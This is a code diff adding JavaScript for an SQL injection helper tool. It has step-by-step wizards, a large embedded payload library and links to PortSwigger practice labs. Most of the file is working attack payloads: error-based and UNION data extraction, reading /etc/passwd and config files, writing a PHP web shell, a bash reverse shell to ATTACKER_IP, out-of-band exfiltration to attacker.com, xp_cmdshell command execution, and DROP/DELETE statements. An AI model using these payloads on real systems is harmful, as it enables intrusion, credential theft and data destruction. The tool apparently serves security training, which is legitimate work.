+        why: "Nest any SELECT query inside EXTRACTVALUE to extract it. Use LIMIT 0,1 then LIMIT 1,1 etc. to paginate through results. GROUP_CONCAT with hex separator 0x3a (:) avoids quote issues.",
+        fix: "Try UPDATEXML as alternative: AND UPDATEXML(1,CONCAT(0x7e,data,0x7e),1)-- -",
+      },
+      {
+        title: 'Step 4: UPDATEXML Alternative (MySQL)',
+        desc: "UPDATEXML is an alternative error-based function when EXTRACTVALUE is filtered.",
+        payloads: [
+          "' AND UPDATEXML(1,CONCAT(0x7e,version(),0x7e),1)-- -",
+          "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1)-- -",
+          "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 0,1),0x7e),1)-- -",
+        ],
+        why: "UPDATEXML(xml, xpath, value) — same principle as EXTRACTVALUE. Inject data into the xpath argument. Both functions are MySQL-specific.",
+        fix: "For PostgreSQL: AND 1=CAST(data AS INT). For MSSQL: AND 1=CONVERT(INT,data). Always adapt to the target DBMS.",
+      },
+    ]
+  },
+  file: {
+    title: '📁 File Operations Wizard',
+    steps: [
+      {
+        title: 'Step 1: Identify Current User',
+        desc: "Confirm you're operating as root or a privileged user.",
+        payloads: ["cn' UNION SELECT 1,user(),3,4-- -", "cn' UNION SELECT 1,CURRENT_USER(),3,4-- -"],
+        why: "File operations require the FILE privilege, which is typically only granted to privileged DB users. root@localhost almost always has it. Other users may not.",
+        fix: "Not root? Check if the user has FILE privilege in the next step — non-root users can still have it.",
+      },
+      {
+        title: 'Step 2: Check FILE Privilege',
+        desc: "Verify the DB user has the FILE privilege required for LOAD_FILE and INTO OUTFILE.",
+        payloads: [
+          "cn' UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user=user()-- -",
+          "cn' UNION SELECT 1,grantee,privilege_type,4 FROM information_schema.user_privileges WHERE privilege_type='FILE'-- -",
+        ],
+        why: "FILE privilege is required for both reading (LOAD_FILE) and writing (INTO OUTFILE). Without it, these statements will silently fail or return NULL. super_priv='Y' implies all privileges.",
+        fix: "No FILE privilege? You cannot do file operations. Pivot to schema enumeration or look for another user with more privileges.",
+      },
+      {
+        title: 'Step 3: Check secure_file_priv',
+        desc: "Verify the secure_file_priv variable allows reading/writing to your target paths.",
+        payloads: [
+          "cn' UNION SELECT 1,variable_value,3,4 FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -",
+          "cn' UNION SELECT 1,@@secure_file_priv,3,4-- -",
+        ],
+        why: "secure_file_priv='': can read/write anywhere. secure_file_priv='/var/lib/mysql-files': restricted to that folder. secure_file_priv=NULL: NO file operations allowed at all.",
+        fix: "NULL value? File ops are disabled. /var/lib/mysql-files path? Can only read/write there — useless for web shells.",
+      },
+      {
+        title: 'Step 4: Read Sensitive Files',
+        desc: "Read system files and application configs using LOAD_FILE().",
+        payloads: [
+          "cn' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4-- -",
+          "cn' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3,4-- -",
+          "cn' UNION SELECT 1,LOAD_FILE('/var/www/html/wp-config.php'),3,4-- -",
+        ],
+        why: "LOAD_FILE reads files readable by the MySQL OS user (usually 'mysql'). /etc/passwd is world-readable. Config files may contain DB credentials, API keys, or application secrets.",
+        fix: "NULL returned? File doesn't exist, wrong path, or OS user can't read it. Try /proc/self/environ or /proc/version instead.",
+      },
+      {
+        title: 'Step 5: Write Web Shell',
+        desc: "Write a PHP webshell to the web root for command execution.",
+        payloads: [
+          "cn' UNION SELECT 1,'<?php system($_REQUEST[0]); ?>',3,4 INTO OUTFILE '/var/www/html/shell.php'-- -",
+          "cn' UNION SELECT '','<?php system($_GET[0]); ?>','','' INTO OUTFILE '/var/www/html/shell.php'-- -",
+        ],
+        why: "INTO OUTFILE writes the SELECT result to a file. Use '' for junk columns to keep shell code clean. The PHP webshell executes OS commands via the 'system()' function when accessed via HTTP.",
+        fix: "Find webroot: read /etc/apache2/apache2.conf or /etc/nginx/nginx.conf. Try paths: /var/www/html, /var/www, /srv/www/htdocs, /usr/local/apache2/htdocs.",
+      },
+      {
+        title: 'Step 6: Execute Commands',
+        desc: "Access the written shell and execute OS commands.",
+        payloads: [
+          "http://target/shell.php?0=id",
+          "http://target/shell.php?0=cat+/etc/passwd",
+          "http://target/shell.php?0=which+nc",
+          "http://target/shell.php?0=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'",
+        ],
+        why: "Access the written file via HTTP. The '0' parameter is passed to system(). 'id' confirms execution as www-data. Chain with reverse shell for full access.",
+        fix: "Shell not executing? PHP may be disabled. Try .phtml, .php5, .php7 extensions. Or write an .htaccess to enable PHP in that directory.",
+      },
+    ]
+  },
+};
+
+function openWizard(type) {
+  wizardType = type;
+  wizardStep = 0;
+  wizardSteps = WIZARDS[type].steps;
+  document.getElementById('wizard-title').textContent = WIZARDS[type].title;
+  document.getElementById('wizard-overlay').classList.add('open');
+  renderWizardStep();
+}
+
+function closeWizard() {
+  document.getElementById('wizard-overlay').classList.remove('open');
+}
+
+function renderWizardStep() {
+  const steps = wizardSteps;
+  const step = steps[wizardStep];
+  const total = steps.length;
+
+  // Progress dots
+  document.getElementById('wizard-progress').innerHTML = steps.map((_,i) =>
+    `<div class="wiz-dot ${i < wizardStep ? 'done' : i === wizardStep ? 'active' : ''}"></div>`
+  ).join('');
+
+  document.getElementById('wizard-step-counter').textContent = `Step ${wizardStep+1} of ${total}`;
+  document.getElementById('wiz-prev').disabled = wizardStep === 0;
+  document.getElementById('wiz-next').textContent = wizardStep === total-1 ? '✓ Done' : 'Next →';
+
+  const payloadHtml = step.payloads.map(p =>
+    `<div class="payload-item" style="background:var(--surface2);border-radius:5px;margin-bottom:4px;padding:8px 10px">
+      <div class="payload-code" style="flex:1">${esc(p)}</div>
+      <button class="btn btn-copy" onclick="copyPayload(this,'${esc(p).replace(/'/g,"\\'")}')">⎘ Copy</button>
+    </div>`
+  ).join('');
+
+  document.getElementById('wizard-body').innerHTML = `
+    <div class="wiz-step active">
+      <div class="wiz-step-title">${esc(step.title)}</div>
+      <div class="wiz-step-desc">${esc(step.desc)}</div>
+      <div style="margin-bottom:12px">${payloadHtml}</div>
+      <details class="wiz-explain">
+        <summary>💡 Why this works</summary>
+        <div style="margin-top:8px">${esc(step.why)}</div>
+      </details>
+      ${step.fix ? `<details class="wiz-explain" style="margin-top:6px">
+        <summary>🔧 If this fails / next steps</summary>
+        <div style="margin-top:8px">${esc(step.fix)}</div>
+      </details>` : ''}
+    </div>
+  `;
+}
+
+function wizNav(dir) {
+  const total = wizardSteps.length;
+  if (dir === 1 && wizardStep === total - 1) { closeWizard(); return; }
+  wizardStep = Math.max(0, Math.min(total - 1, wizardStep + dir));
+  renderWizardStep();
+}
+
+// ESC key closes wizard
+document.addEventListener('keydown', e => {
+  if (e.key === 'Escape') closeWizard();
+  if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
+    e.preventDefault();
+    document.getElementById('search-global').focus();
+  }
+});
+
+// Global search → payload lib
+document.getElementById('search-global').addEventListener('input', function() {
+  const val = this.value.trim();
+  if (val) {
+    nav('payload-lib');
+    document.getElementById('lib-search').value = val;
+    searchLib();
+  }
+});
+
+document.getElementById('search-global').addEventListener('keydown', function(e) {
+  if (e.key === 'Enter' && this.value.trim()) {
+    nav('payload-lib');
+    document.getElementById('lib-search').value = this.value;
+    searchLib();
+  }
+});
+
+// Re-render union tab when config changes
+document.querySelectorAll('#page-union-inject input, #page-union-inject select').forEach(el => {
+  el.addEventListener('change', () => renderUnionTab(currentUnionTab));
+});
+
+// ═══════════════════════════════════════════════════════════
+// INIT
+// ═══════════════════════════════════════════════════════════
+
+function init() {
+  initDiscovery();
+  initAuthLib();
+  initBoolLib();
+  initErrLib();
+  initFileCheck();
+  initCommonFiles();
+  initBypassChips();
+  initWafLib();
+  initLib();
+  initReference();
+  renderUnionTab('col-detection');
+}
+
+init();
+injectExtraPages();
+
+// EXTENSIBILITY: ADD NEW PAYLOAD CATEGORIES TO allPayloads ARRAY ABOVE
+// EXTENSIBILITY: ADD NEW WIZARD TYPES IN THE WIZARDS OBJECT ABOVE
+// EXTENSIBILITY: ADD NEW NAV ITEMS AND PAGES BY FOLLOWING EXISTING PATTERNS
+// EXTENSIBILITY: ADD NEW BYPASS TRANSFORMS TO bypassTransforms ARRAY ABOVE
+// EXTENSIBILITY: ADD NEW EXTERNAL SOURCES IN extSourceDefs ARRAY BELOW
+
+// ═══════════════════════════════════════════════════════════
+// PAYLOAD-BOX EMBEDDED PAYLOADS (full coverage of the repo)
+// Source: https://github.com/payload-box/sql-injection-payload-list
+// ═══════════════════════════════════════════════════════════
+
+const PAYLOADBOX = {
+  generic: [
+    "'","''","'\"","';","\"","\";","\" OR \"\"=\"","\" OR 1 = 1 -- -","\" OR \"1\"=\"1",
+    "' OR ''='","' OR '1'='1","' OR 1 = 1 -- -","' OR 1=1","' OR 1=1--","' OR 1=1#",
+    "' OR 1=1/*","' OR 1=1 LIMIT 1--","'='","'LIKE'","'=0--+","' OR 'x'='x",
+    "' AND 1=1--","' AND 1=1#","' AND 1=1/*","' AND 1=2--","' AND 1=2#",
+    "1' AND '1'='1","1' AND '1'='2","' AND '1'='1","' AND '1'='2",
+    "1 AND 1=1","1 AND 1=2","1 AND 1=1--","1 AND 1=2--",
+    "' OR 'unusual'='unusual","' OR 'a'='a","' OR 'a'='a'--",
+    "' OR 0=0 --","' OR 0=0 #","' OR 0=0/*",
+    "\" OR 0=0 --","\" OR 0=0 #","\" OR 0=0/*",
+    "' OR 1=1 --","' OR 1=1 #","' OR 1=1/*",
+    "\" OR 1=1 --","\" OR 1=1 #","\" OR 1=1/*",
+    "' OR \"a\"=\"a","\" OR \"a\"=\"a","') OR ('a'='a","\"a\"\" OR \"1\"=\"1",
+    "' OR 1 -- -","\" OR 1 -- -","OR 1=1","OR 1=1--","OR 1=1#",
+    "' UNION SELECT 1-- -","' UNION SELECT 1,2-- -","' UNION SELECT 1,2,3-- -",
+    "' UNION SELECT NULL-- -","' UNION SELECT NULL,NULL-- -",
+    "admin' --","admin' #","admin'/*","admin' or '1'='1","admin' or '1'='1'--",
+    "admin' or '1'='1'#","admin' or '1'='1'/*","admin'or 1=1 or ''='",
+    "admin' or 1=1","admin' or 1=1--","admin' or 1=1#","admin' or 1=1/*",
+    "' HAVING 1=1--","' GROUP BY columnnames having 1=1 --",
+    "' ORDER BY 1--","' ORDER BY 1,2--","' ORDER BY 1,2,3--",
+    "; DROP TABLE members --","; DROP SAMPLETABLE--","; DROP TABLE MEMBERS--",
+    "1;DROP TABLE users",
+    "' AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'),1,1)))>116--",
+    "' AND 1=0 UNION ALL SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055",
+    "' AND MID(VERSION(),1,1) = '5","' AND MID(VERSION(),1,1) = '4",
+    "' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --",
+    "' UNION SELECT 1,@@version,3,4,5,6,7,8,9-- -",
+    "0x27","0x3D","0x27 OR 1=1",
+    "char(39)","char(39)+char(39)","CHAR(0x27)","CHR(39)",
+    "%27","%%2727","%2527","%25%27",
+    "1' ORDER BY 1--+","1' ORDER BY 2--+","1' ORDER BY 3--+",
+    "1' GROUP BY 1,2,--+","1' GROUP BY 1,2,3--+",
+    "' GROUP BY columnnames having 1=1 --",
+  ],
+  error_based: [
+    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -",
+    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 0,1)))-- -",
+    "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)-- -",
+    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)-- -",
+    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
+    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
+    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
+    "AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))--",
+    "AND 1=CONVERT(INT,(SELECT TOP 1 column_name FROM information_schema.columns))--",
+    "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)-- -",
+    "' AND 1=CAST(version() AS INT)-- -",
+    "' AND exp(~(SELECT * FROM (SELECT user())x))-- -",
+    "' AND GeometryCollection(( SELECT * FROM (SELECT * FROM (SELECT version())a)b))-- -",
+    "' AND polygon((SELECT * FROM (SELECT * FROM (SELECT version())a)b))-- -",
+    "' AND MultiPoint((SELECT * FROM (SELECT * FROM (SELECT user())a)b))-- -",
+    "' AND LineString((SELECT * FROM (SELECT * FROM (SELECT database())a)b))-- -",
+    "' PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,version())),1)-- -",
+  ],
+  time_based: [
+    "' AND SLEEP(5)-- -","' AND SLEEP(10)-- -","' OR SLEEP(5)-- -","1 AND SLEEP(5)",
+    "1; WAITFOR DELAY '0:0:5'","'; WAITFOR DELAY '0:0:5'--","1'; WAITFOR DELAY '0:0:5'--",
+    "1 WAITFOR DELAY '0:0:5'--","'; WAITFOR DELAY '0:0:5'--+",
+    "1 OR SLEEP(5)","1 OR SLEEP(5)#","1 OR SLEEP(5)--",
+    "' OR SLEEP(5)#","' OR SLEEP(5)--","' OR SLEEP(5)/*",
+    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)","' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
+    "IF(1=1, SLEEP(5), 0)","' AND IF(1=1,SLEEP(5),0)-- -",
+    "' AND IF(1=2,SLEEP(5),0)-- -","' AND IF(LENGTH(database())>1,SLEEP(5),0)-- -",
+    "1' AND SLEEP(5)-- -","1 AND SLEEP(5)-- -",
+    "'; SELECT SLEEP(5)-- -","'; SELECT pg_sleep(5)-- -",
+    "'; SELECT pg_sleep(10)-- -","' OR pg_sleep(5)-- -",
+    "' AND pg_sleep(5)-- -","1; SELECT pg_sleep(5)--",
+    "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -",
+    "' AND (SELECT CASE WHEN (1=2) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -",
+    "' OR 1=1; WAITFOR DELAY '0:0:5'--",
+    "' AND 1=0; WAITFOR DELAY '0:0:5'--",
+    "'; exec master..xp_cmdshell 'ping 127.0.0.1 -n 5'--",
+  ],
+  auth_bypass: [
+    "' OR 1=1--","' OR 1=1#","' OR 1=1/*","' OR 1=1 LIMIT 1--",
+    "' OR '1'='1'--","' OR '1'='1'#","' OR '1'='1'/*",
+    "admin' --","admin' #","admin'/*","admin' or 1=1--",
+    "admin' or '1'='1","admin'-- -","admin'#",
+    "') or ('1'='1","') or ('1'='1'--",
+    "') or 1=1--","') or 1=1#",
+    "' or 'a'='a","\" or \"a\"=\"a",
+    "' or ''='","\" or \"\"=\"",
+    "1' or '1' = '1","1' or '1' = '1'--",
+    "' OR 'one'='one","1' OR '2'>'1",
+    "' OR 1=1 UNION SELECT 1,1--",
+    "\" OR 1=1--","\" OR \"1\"=\"1",
+    "' OR 1 IN (SELECT 1)--",
+    "admin'; --","' ; --","'; --",
+    "x' OR full_name LIKE '%Smith%",
+    "' UNION SELECT 1,'admin','admin','admin@admin.com','hacked','Y',NULL,NULL--",
+    "1 or 1=1","1 or 1=1--","1 or 1=1#","1 or 1=1/*",
+    "' or 1=1 limit 1 -- -+","' or 1=1 limit 1--","' or 1=1 limit 1#",
+    "1' GROUP BY 1--","1' GROUP BY 2--",
+  ],
+  union_select: [
+    "' UNION SELECT NULL--","' UNION SELECT NULL,NULL--","' UNION SELECT NULL,NULL,NULL--",
+    "' UNION SELECT NULL,NULL,NULL,NULL--","' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
+    "' UNION ALL SELECT NULL--","' UNION ALL SELECT NULL,NULL--",
+    "' UNION SELECT 1--","' UNION SELECT 1,2--","' UNION SELECT 1,2,3--",
+    "' UNION SELECT 1,2,3,4--","' UNION SELECT 1,2,3,4,5--",
+    "' UNION ALL SELECT 1--","' UNION ALL SELECT 1,2--","' UNION ALL SELECT 1,2,3--",
+    "' UNION SELECT @@version,NULL,NULL--","' UNION SELECT user(),NULL,NULL--",
+    "' UNION SELECT database(),NULL,NULL--",
+    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
+    "' UNION SELECT column_name,NULL FROM information_schema.columns--",
+    "' UNION SELECT username,password FROM users--",
+    "' UNION SELECT login,password FROM admins--",
+    "' UNION SELECT 1,@@version-- -","' UNION SELECT 1,user()-- -",
+    "' UNION SELECT 1,database()-- -","' UNION SELECT 1,@@datadir-- -",
+    "' UNION SELECT 1,@@basedir-- -","' UNION SELECT 1,@@hostname-- -",
+    "' UNION SELECT schema_name,NULL FROM information_schema.schemata--",
+    "' UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--",
+    "' UNION SELECT 1,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--",
+    "0 UNION SELECT 1,concat(login,password),3 FROM users--",
+    "-1 UNION SELECT 1,2,3--","-1 UNION ALL SELECT 1,2,3--",
+    "1 UNION (SELECT 1,2,3)","1 UNION (SELECT username,password,3 FROM users)",
+    "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--",
+    "' UNION SELECT 1,LOAD_FILE('/etc/passwd')-- -",
+  ],
+  stacked: [
+    "'; INSERT INTO users (username,password) VALUES ('hacker','hacked')--",
+    "'; UPDATE users SET password='hacked' WHERE username='admin'--",
+    "'; DELETE FROM users--",
+    "'; DROP TABLE users--",
+    "'; EXEC xp_cmdshell('id')--",
+    "'; EXEC xp_cmdshell('whoami')--",
+    "'; EXEC master..xp_cmdshell('dir')--",
+    "'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE--",
+    "1; SELECT pg_sleep(5)--",
+    "'; SELECT * INTO OUTFILE '/tmp/test.txt' FROM users--",
+  ],
+  oob: [
+    "' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\a'))-- -",
+    "' AND (SELECT * FROM (SELECT(LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\a'))))a)-- -",
+    "'; EXEC master..xp_dirtree '//attacker.com/a'--",
+    "'; EXEC master..xp_fileexist '//attacker.com/a'--",
+    "UTL_HTTP.REQUEST('http://attacker.com/'||user)",
+    "UTL_FILE.GET_LINE(UTL_FILE.FOPEN('//attacker.com/a','r',1))",
+    "' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||user) FROM dual--",
+    "'; DBMS_LDAP.INIT(('attacker.com',80); --",
+    "' AND 1=2 UNION SELECT 1,UTL_HTTP.REQUEST('http://attacker.com/'||version()) FROM dual--",
+  ],
+  second_order: [
+    "admin'--  (store as username, triggers later in a query using stored value)",
+    "' OR 1=1-- (injected during registration, triggered on login)",
+    "hacker'-- (profile name injection for second-order in queries)",
+    "'; UPDATE users SET admin='1' WHERE username='attacker'--",
+  ],
+  polyglot: [
+    "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
+    "' UNION SELECT '2",
+    "' OR 1=1 UNION SELECT 1,2 OR 1=1",
+    "1' AND SLEEP(0) UNION SELECT 0x41,0x42 AND SLEEP(0)-- -",
+    ";SELECT * FROM users WHERE username='' OR 1=1--",
+    "1/**/UNION/**/SELECT/**/1,2,3--",
+    "' OR 1=1; EXEC xp_cmdshell('id');--",
+    "' UNION SELECT NULL,NULL,NULL--",
+    "%0a' OR 1=1 -- -",
+    "'%09UNION%09SELECT%091,2,3--",
+  ],
+};
+
+// PortSwigger topic → lab URL mappings
+const PORTSWIGGER_TOPICS = [
+  {
+    section: 'Core Concepts',
+    items: [
+      {title:'What is SQL injection (SQLi)?', url:'https://portswigger.net/web-security/sql-injection', desc:'Foundational explanation — how SQLi works and why', type:'reading'},
+      {title:'SQL injection cheat sheet', url:'https://portswigger.net/web-security/sql-injection/cheat-sheet', desc:'Official reference for all DBMS-specific syntax', type:'reference'},
+      {title:'SQL injection in different contexts', url:'https://portswigger.net/web-security/sql-injection#sql-injection-in-different-contexts', desc:'JSON, XML, HTTP header injection contexts', type:'reading'},
+    ]
+  },
+  {
+    section: 'Detection',
+    items: [
+      {title:'How to detect SQL injection vulnerabilities', url:'https://portswigger.net/web-security/sql-injection#how-to-detect-sql-injection-vulnerabilities', desc:'Manual detection methodology', type:'reading'},
+      {title:'Lab: SQL injection vulnerability in WHERE clause (RETRIEVE HIDDEN DATA)', url:'https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data', desc:'Modify WHERE clause to return extra rows', type:'lab'},
+      {title:'Lab: SQL injection vulnerability allowing login bypass', url:'https://portswigger.net/web-security/sql-injection/lab-login-bypass', desc:"Bypass login using ' OR 1=1-- technique", type:'lab'},
+    ]
+  },
+  {
+    section: 'UNION Attacks',
+    items: [
+      {title:'SQL injection UNION attacks (overview)', url:'https://portswigger.net/web-security/sql-injection/union-attacks', desc:'Complete guide: column count, data types, extraction', type:'reading'},
+      {title:'Lab: Determine number of columns using ORDER BY', url:'https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns', desc:'ORDER BY incremental approach', type:'lab'},
+      {title:'Lab: Find column containing text', url:'https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text', desc:'Identify which column returns string data', type:'lab'},
+      {title:'Lab: Retrieve data from other tables', url:'https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables', desc:'Extract users/passwords from another table', type:'lab'},
+      {title:'Lab: Retrieve multiple values in a single column', url:'https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column', desc:'CONCAT/GROUP_CONCAT to merge fields', type:'lab'},
+    ]
+  },
+  {
+    section: 'Examining the Database',
+    items: [
+      {title:'Examining the database in SQL injection attacks', url:'https://portswigger.net/web-security/sql-injection/examining-the-database', desc:'DBMS fingerprinting, schema enumeration', type:'reading'},
+      {title:'Lab: Query the database type and version (MySQL/MSSQL)', url:'https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft', desc:'@@version via UNION', type:'lab'},
+      {title:'Lab: Query the database type and version (Oracle)', url:'https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle', desc:'v$version via UNION', type:'lab'},
+      {title:'Lab: Listing database contents (non-Oracle)', url:'https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle', desc:'information_schema enumeration', type:'lab'},
+      {title:'Lab: Listing database contents (Oracle)', url:'https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle', desc:'all_tables / all_columns', type:'lab'},
+    ]
+  },
+  {
+    section: 'Blind SQL Injection',
+    items: [
+      {title:'Blind SQL injection (overview)', url:'https://portswigger.net/web-security/sql-injection/blind', desc:'Boolean-based, time-based, OOB techniques', type:'reading'},
+      {title:'Lab: Blind SQLi with conditional responses', url:'https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses', desc:'Cookie-based injection — boolean binary search', type:'lab'},
+      {title:'Lab: Blind SQLi with conditional errors (Oracle)', url:'https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors', desc:'CASE WHEN with DBMS error triggering', type:'lab'},
+      {title:'Lab: Blind SQLi with time delays', url:'https://portswigger.net/web-security/sql-injection/blind/lab-time-delays', desc:'Confirm injection via pg_sleep(10)', type:'lab'},
+      {title:'Lab: Blind SQLi with time delays and information retrieval', url:'https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval', desc:'Extract password char-by-char via timing', type:'lab'},
+      {title:'Lab: Blind SQLi with out-of-band interaction', url:'https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band', desc:'DNS exfiltration via Burp Collaborator', type:'lab'},
+      {title:'Lab: Blind SQLi with out-of-band data exfiltration', url:'https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration', desc:'OOB data via DNS query', type:'lab'},
+      {title:'Lab: Blind SQLi with verbose error messages', url:'https://portswigger.net/web-security/sql-injection/blind/lab-verbose-error-messages', desc:'Trigger detailed error to expose query', type:'lab'},
+    ]
+  },
+  {
+    section: 'Error-Based',
+    items: [
+      {title:'Error-based SQL injection', url:'https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-conditional-errors', desc:'Using error messages as data channel', type:'reading'},
+      {title:'Lab: Visible error-based SQLi', url:'https://portswigger.net/web-security/sql-injection/blind/lab-visible-error-based-injection', desc:'CAST error reveals admin password', type:'lab'},
+    ]
+  },
+  {
+    section: 'Advanced / Special Contexts',
+    items: [
+      {title:'Second-order SQL injection', url:'https://portswigger.net/web-security/sql-injection#second-order-sql-injection', desc:'Stored injection triggered by different functionality', type:'reading'},
+      {title:'SQL injection via XML encoding bypass', url:'https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding', desc:'WAF bypass using XML + hex entity encoding', type:'lab'},
+      {title:'SQL injection in different HTTP locations', url:'https://portswigger.net/web-security/sql-injection#sql-injection-in-different-parts-of-the-query', desc:'WHERE, ORDER BY, INSERT, UPDATE, subquery', type:'reading'},
+    ]
+  },
+  {
+    section: 'Prevention',
+    items: [
+      {title:'How to prevent SQL injection', url:'https://portswigger.net/web-security/sql-injection#how-to-prevent-sql-injection', desc:'Parameterized queries, allow-list, WAF', type:'reading'},
+    ]
+  },
+];
+
+// Advanced technique payloads not in main DB
+const ADVANCED_PAYLOADS = {
+  second_order: [
+    {payload:"admin'--", desc:"Store as username → later use in UPDATE/SELECT triggers injection"},
+    {payload:"' OR 1=1--", desc:"Stored during registration → triggers on login query"},
+    {payload:"hacker'-- ", desc:"Profile name → injected in WHERE username='...' query"},
+    {payload:"'; UPDATE users SET password='pwned' WHERE '1'='1", desc:"Stored update injection"},
+    {payload:"' UNION SELECT 1,password,3 FROM users--", desc:"Second-order UNION via stored input"},
+  ],
+  json_xml: [
+    {payload:'{"username":"admin\'--","password":"x"}', desc:"JSON body injection — quote in JSON value"},
+    {payload:"<user><name>admin'--</name></user>", desc:"XML injection in SOAP/REST body"},
+    {payload:"admin&#x27;--", desc:"HTML-entity encoded quote — XML context WAF bypass"},
+    {payload:"admin&#39;--", desc:"Decimal entity encoded quote"},
+    {payload:'{"username":"admin\\u0027--","password":"x"}', desc:"Unicode escape in JSON"},
+    {payload:'{"id":"1 UNION SELECT 1,username,password FROM users-- "}', desc:"JSON field UNION injection"},
+  ],
+  http_headers: [
+    {payload:"' OR 1=1-- -", desc:"X-Forwarded-For header injection (if logged to DB)"},
+    {payload:"1' OR '1'='1", desc:"User-Agent header injection (analytics/logging DB queries)"},
+    {payload:"' UNION SELECT NULL,NULL,user()-- -", desc:"Referer header UNION injection"},
+    {payload:"admin'-- -", desc:"Cookie value injection: e.g., Cookie: session=admin'-- -"},
+    {payload:"' OR 1=1#", desc:"Custom auth header injection"},
+  ],
+  order_by: [
+    {payload:"1 ASC,(SELECT 1 FROM (SELECT(SLEEP(5)))a)", desc:"ORDER BY injection — time-based blind"},
+    {payload:"(SELECT CASE WHEN (1=1) THEN name ELSE id END)", desc:"ORDER BY conditional"},
+    {payload:"(SELECT 1 FROM users WHERE username='admin' AND SLEEP(5))", desc:"ORDER BY subquery sleep"},
+    {payload:"IF(1=1,name,id)", desc:"MySQL IF() in ORDER BY"},
+    {payload:"1,2; DROP TABLE users--", desc:"ORDER BY stacked query (MSSQL)"},
+    {payload:"FIELD(id,3,1,2)", desc:"MySQL FIELD() in ORDER BY — reorder based on values"},
+  ],
+  routed: [
+    {payload:"-1' UNION SELECT 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061--", desc:"Routed injection — hex-encoded 2nd query passed to first"},
+    {payload:"-1 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='sqli_one'", desc:"Routed UNION — result used in 2nd query"},
+    {payload:"' UNION ALL SELECT 'second_query_injection_here'-- -", desc:"Routed — string passes to 2nd query context"},
+  ],
+  truncation: [
+    {payload:"admin'                                                                          ", desc:"Spaces after username cause DB truncation on fixed-width fields"},
+    {payload:"admin         '", desc:"Trailing space truncation bypass — old MySQL behavior"},
+    {payload:"admin\x00", desc:"Null byte truncation in older MySQL"},
+  ],
+  nosql_like: [
+    {payload:"' || '1'='1", desc:"NoSQL-style OR for some ORM layers"},
+    {payload:"'; return true; var a='", desc:"Template injection that falls into SQL"},
+    {payload:"[$ne]=1", desc:"MongoDB NoSQL — different context, shown for awareness"},
+  ],
+  mssql_specific: [
+    {payload:"'; EXEC xp_cmdshell('whoami')--", desc:"MSSQL OS command execution — requires sa or sysadmin"},
+    {payload:"'; EXEC master..xp_cmdshell('net user')--", desc:"List Windows users"},
+    {payload:"'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE--", desc:"Enable xp_cmdshell if disabled"},
